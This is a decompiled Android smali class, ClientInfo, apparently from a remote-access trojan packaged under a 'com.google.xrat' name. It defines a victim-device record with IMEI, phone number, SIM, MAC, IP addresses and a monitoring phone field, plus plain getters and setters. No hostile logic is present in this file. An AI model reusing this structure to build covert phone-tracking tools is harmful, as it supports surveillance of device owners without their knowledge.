.class public Lcom/google/xrat/protocol/ClientInfo;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/io/Serializable;


# static fields
.field private static final serialVersionUID:J = -0x1adf456148958407L


# instance fields
.field private addr:Ljava/lang/String;

.field private cpuInfo:Ljava/lang/String;

.field private firstOnlineIp:Ljava/lang/String;

.field private firstOnlineTime:Ljava/lang/String;

.field private id:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private innerIp:Ljava/lang/String;

.field private ipAddr:Ljava/lang/String;

.field private isWifi:Z

.field private lastOnlineIp:Ljava/lang/String;

.field private lastOnlineTime:Ljava/lang/String;

.field private mac:Ljava/lang/String;

.field private memoryInfo:Ljava/lang/String;

.field private monitorPhone:Ljava/lang/String;

.field private onlineTime:Ljava/lang/String;

.field private osInfo:Ljava/lang/String;

.field private phoneBrand:Ljava/lang/String;

.field private phoneNumber:Ljava/lang/String;

.field private remark:Ljava/lang/String;

.field private simNum:Ljava/lang/String;

.field private simOperator:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->id:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    iput-object p3, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    iput-object p4, p0, Lcom/google/xrat/protocol/ClientInfo;->mac:Ljava/lang/String;

    iput-object p5, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    iput-object p6, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    iput-object p7, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    iput-object p8, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    iput-object p9, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    iput-object p10, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    iput-object p11, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineTime:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->id:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    iput-object p3, p0, Lcom/google/xrat/protocol/ClientInfo;->ipAddr:Ljava/lang/String;

    iput-object p5, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    iput-object p4, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    iput-object p6, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    iput-object p7, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    iput-object p8, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    iput-object p9, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    iput-object p10, p0, Lcom/google/xrat/protocol/ClientInfo;->addr:Ljava/lang/String;

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->onlineTime:Ljava/lang/String;

    iput-object p11, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    iput-object p12, p0, Lcom/google/xrat/protocol/ClientInfo;->simNum:Ljava/lang/String;

    iput-object p13, p0, Lcom/google/xrat/protocol/ClientInfo;->innerIp:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    iput-object p3, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    iput-object p4, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    iput-object p5, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    iput-object p6, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    iput-object p7, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/google/xrat/protocol/ClientInfo;->onlineTime:Ljava/lang/String;

    iput-object p8, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    iput-object p9, p0, Lcom/google/xrat/protocol/ClientInfo;->simNum:Ljava/lang/String;

    iput-object p10, p0, Lcom/google/xrat/protocol/ClientInfo;->monitorPhone:Ljava/lang/String;

    iput-object p11, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineIp:Ljava/lang/String;

    iput-object p12, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineTime:Ljava/lang/String;

    move-object/from16 v0, p13

    iput-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineIp:Ljava/lang/String;

    move-object/from16 v0, p14

    iput-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineTime:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 3

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->id:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    iput-object p3, p0, Lcom/google/xrat/protocol/ClientInfo;->ipAddr:Ljava/lang/String;

    iput-object p5, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    iput-object p4, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    iput-object p6, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    iput-object p7, p0, Lcom/google/xrat/protocol/ClientInfo;->simNum:Ljava/lang/String;

    iput-object p8, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    iput-object p9, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    iput-object p10, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    iput-object p11, p0, Lcom/google/xrat/protocol/ClientInfo;->addr:Ljava/lang/String;

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/google/xrat/protocol/ClientInfo;->onlineTime:Ljava/lang/String;

    iput-object p12, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    move-object/from16 v0, p13

    iput-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->mac:Ljava/lang/String;

    move/from16 v0, p14

    iput-boolean v0, p0, Lcom/google/xrat/protocol/ClientInfo;->isWifi:Z

    return-void
.end method

.method public static getSerialversionuid()J
    .locals 2

    const-wide v0, -0x1adf456148958407L

    return-wide v0
.end method


# virtual methods
.method public getAddr()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->addr:Ljava/lang/String;

    return-object v0
.end method

.method public getCpuInfo()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    return-object v0
.end method

.method public getFirstOnlineIp()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineIp:Ljava/lang/String;

    return-object v0
.end method

.method public getFirstOnlineTime()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineTime:Ljava/lang/String;

    return-object v0
.end method

.method public getId()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->id:Ljava/lang/String;

    return-object v0
.end method

.method public getImei()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    return-object v0
.end method

.method public getInnerIp()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->innerIp:Ljava/lang/String;

    return-object v0
.end method

.method public getIpAddr()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->ipAddr:Ljava/lang/String;

    return-object v0
.end method

.method public getIsWifi()Z
    .locals 1

    iget-boolean v0, p0, Lcom/google/xrat/protocol/ClientInfo;->isWifi:Z

    return v0
.end method

.method public getLastOnlineIp()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineIp:Ljava/lang/String;

    return-object v0
.end method

.method public getLastOnlineTime()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineTime:Ljava/lang/String;

    return-object v0
.end method

.method public getMac()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->mac:Ljava/lang/String;

    return-object v0
.end method

.method public getMemoryInfo()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    return-object v0
.end method

.method public getMonitorPhone()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->monitorPhone:Ljava/lang/String;

    return-object v0
.end method

.method public getOnlineTime()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->onlineTime:Ljava/lang/String;

    return-object v0
.end method

.method public getOsInfo()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneBrand()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneNumber()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    return-object v0
.end method

.method public getRemark()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    return-object v0
.end method

.method public getSimOperator()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    return-object v0
.end method

.method public getsimNum()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/ClientInfo;->simNum:Ljava/lang/String;

    return-object v0
.end method

.method public setAddr(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->addr:Ljava/lang/String;

    return-void
.end method

.method public setCpuInfo(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->cpuInfo:Ljava/lang/String;

    return-void
.end method

.method public setFirstOnlineIp(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineIp:Ljava/lang/String;

    return-void
.end method

.method public setFirstOnlineTime(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->firstOnlineTime:Ljava/lang/String;

    return-void
.end method

.method public setId(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->id:Ljava/lang/String;

    return-void
.end method

.method public setImei(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->imei:Ljava/lang/String;

    return-void
.end method

.method public setInnerIp(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->innerIp:Ljava/lang/String;

    return-void
.end method

.method public setIpAddr(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->ipAddr:Ljava/lang/String;

    return-void
.end method

.method public setLastOnlineIp(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineIp:Ljava/lang/String;

    return-void
.end method

.method public setLastOnlineTime(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->lastOnlineTime:Ljava/lang/String;

    return-void
.end method

.method public setMac(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->mac:Ljava/lang/String;

    return-void
.end method

.method public setMemoryInfo(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->memoryInfo:Ljava/lang/String;

    return-void
.end method

.method public setMonitorPhone(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->monitorPhone:Ljava/lang/String;

    return-void
.end method

.method public setOnlineTime(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->onlineTime:Ljava/lang/String;

    return-void
.end method

.method public setOsInfo(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->osInfo:Ljava/lang/String;

    return-void
.end method

.method public setPhoneBrand(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneBrand:Ljava/lang/String;

    return-void
.end method

.method public setPhoneNumber(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->phoneNumber:Ljava/lang/String;

    return-void
.end method

.method public setRemark(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->remark:Ljava/lang/String;

    return-void
.end method

.method public setSimOperator(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->simOperator:Ljava/lang/String;

    return-void
.end method

.method public setWifi(Z)V
    .locals 0

    iput-boolean p1, p0, Lcom/google/xrat/protocol/ClientInfo;->isWifi:Z

    return-void
.end method

.method public setsimNum(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/ClientInfo;->simNum:Ljava/lang/String;

    return-void
.end method
